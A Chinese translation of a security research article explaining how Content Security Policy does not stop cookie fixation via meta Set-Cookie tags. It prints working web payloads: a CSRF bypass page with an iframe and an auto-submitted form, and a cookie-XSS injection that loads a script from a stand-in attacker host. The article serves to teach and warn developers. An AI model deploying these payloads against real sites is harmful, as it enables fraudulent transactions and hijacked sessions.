> 原文链接: https://www.anquanke.com//post/id/85365 


# 【技术分享】CSP flaws: cookie fixation


                                阅读量   
                                **72175**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：detectify.com
                                <br>原文地址：[https://labs.detectify.com/2017/01/12/csp-flaws-cookie-fixation/](https://labs.detectify.com/2017/01/12/csp-flaws-cookie-fixation/)

译文仅供参考，具体内容表达以及含义原文为准



****

**[![](https://p1.ssl.qhimg.com/t010c77f04bb548b07c.jpg)](https://p1.ssl.qhimg.com/t010c77f04bb548b07c.jpg)**

**翻译：**[**shan66**](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：80RMB**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>



**前言**

我们知道，CSP不会阻止&lt;meta http-equiv ="Set-Cookie" content ="a = b"&gt;这样的标签。因此，对于含有XSS漏洞的页面来说，即使提供了CSP保护，攻击者仍然可以通过写入Cookie来发动攻击。 下面，我们来考察一些与Cookie篡改漏洞有关的例子。

<br>

**双重提交Cookie示例**

双重提交cookie是一些应用程序和框架用于处理CSRF的技术。这意味着所有表单都必须包含一个在cookie中设置的令牌。 如果在表单中发送的令牌与cookie中的令牌不同，则请求被丢弃。 这种技术被OWASP推荐为基于会话的令牌的替代方案。

在伪代码中它可能看起来像这样：



```
//User sent the form
if(isset($_POST['submit']))`{`
         if($_POST['token'] == $_COOKIE['token'])`{`
                  //Accept the form
         `}`else`{`
                  echo "CSRF ATTACK DETECTED";
                  exit();
         `}`
`}`
```

没有CSP的时候，如果应用程序含有XSS漏洞，那么攻击者就可以使用脚本来填写并提交他们想要攻击的任何表单：



```
&lt;script&gt;
document.getElementById('sendmoneyto').value = 'Mathias';
document.getElementById('form').submit();
&lt;/script&gt;
```

使用CSP后，我们就可以（通过使用随机数或限制内联脚本）避免这种情况了。然而，攻击者可以使用以下payload来实现同样的事情：

```
&lt;meta http-equiv="Set-Cookie" content="token=NotSoSecretAnyMore"&gt;
```

然后，在攻击者的网站上：



```
&lt;script&gt;
function submitForm()`{`
  document.forms[0].submit();
`}`
&lt;/script&gt;
&lt;iframe src='http://targetapplication/vulnerabletoxss?parameter=&lt;meta http-equiv="Set-Cookie" content="token=NotSoSecretAnyMore"&gt;' onload="submitForm()"&gt;&lt;/iframe&gt;
&lt;form action="http://targetapplication/targetform" method="POST"&gt;
&lt;input type="hidden" name="token" value="NotSoSecretAnyMore" /&gt;
&lt;input type="hidden" name="sendmoneyto" value="Mathias" /&gt;
&lt;/form&gt;
```

因为攻击者能够改写令牌，所以他们可以在其页面上的表单中使用新令牌，从而绕过CSRF保护措施。

<br>

**双会话示例**

现实中，使用多个会话Cookie的应用程序是非常少见的。例如，主应用程序使用一个会话Cookie，而“次应用程序”使用另一个会话Cookie。

如果攻击者可以篡改cookie，他们就可以让受害者在主应用程序中使用攻击者的会话cookie。这样的话，就可以让受害者在主应用程序中以攻击者身份登录，而在次应用程序中以受害者身份登录。

如果应用程序从主应用程序提取送货数据，那么受害人在次应用程序中购买的产品就会被发往攻击者的地址。

<br>

**子域cookie XSS示例**

如果子域中存在cookie XSS漏洞，攻击者可以使用cookie篡改漏洞来设置XSS cookie，然后重定向到易受攻击的页面：



```
&lt;meta http-equiv="Set-Cookie" content="vulnerableCookie=&lt;script src=//attackers/page.js&gt;"&gt;
&lt;meta http-equiv="refresh" content="0;URL=http://othersubdomain.vulnerable/page_vulnerable_to_cookie_xss"&gt;
```



**结论**

虽然许多客户端漏洞都可以通过CSP进行缓解，但是Cookie篡改仍然会导致一些安全问题，因为它对于这种漏洞根本不起作用。当开发使用CSP和cookie的应用程序时，一定要注意各种类型攻击的不同之处。
